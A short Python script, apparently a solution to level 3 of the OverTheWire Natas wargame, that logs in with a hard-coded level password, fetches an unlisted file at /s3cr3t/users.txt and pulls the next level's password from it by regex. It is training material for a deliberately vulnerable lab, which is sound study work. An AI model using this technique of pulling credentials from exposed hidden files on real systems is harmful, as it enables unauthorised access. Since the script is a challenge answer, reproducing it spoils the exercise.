#!/bin/python3
import requests
import re

user = 'natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'

url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % user

risposta = requests.get(url, auth=(user, password))
testo = risposta.text

print(testo)

re = re.findall('natas4:(.*)', testo)
print('Password:')
print(re[0])
